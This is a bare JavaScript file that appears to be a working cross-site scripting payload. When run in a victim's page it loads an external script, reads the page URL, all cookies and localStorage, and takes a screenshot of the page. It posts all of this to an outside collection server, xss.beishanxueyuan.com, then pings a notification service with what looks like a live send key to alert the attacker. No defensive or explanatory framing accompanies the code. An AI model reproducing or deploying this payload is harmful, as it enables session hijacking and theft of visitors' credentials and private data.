var s1 = document.createElement('script');
s1.src = 'https://xss.beishanxueyuan.com/1.js';
const currentUrl = window.location.href;
const currentCookie = "COOKIE:"+document.cookie+"\n"+"localStorage"+JSON.stringify(localStorage);
s1.onload = async function () {
    try {
            const canvas = await html2canvas(document.documentElement);
            const base64 = canvas.toDataURL('image/png');
            const requestOptions = {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    url: currentUrl,
                    screenshot: base64,
                    cookie:currentCookie
                })
            };
            fetch('https://xss.beishanxueyuan.com/api/get', requestOptions)
  .then(response => {
        if (!response.ok) {
            throw new Error('网络响应不正常');
        }
        return response.json();
    })
  .then(data => {
        console.log('请求成功:', data);
    })
  .catch(error => {
        console.error('请求出错:', error);
    });
    } catch (error) {
        console.error(error);
    }
};
document.body.appendChild(s1);


try {
        const response = await fetch('https://sctapi.ftqq.com/SCT264973TwyxLsp1rLVuTjZ3jHX2DFGJi.send?title=XSS!!!&desp='+currentUrl, {
          method: 'GET'
        });
        const result = await response.json();
        console.log('邮件发送结果:', result);
        }
        
        catch(error){
          console.error(error)
      
        }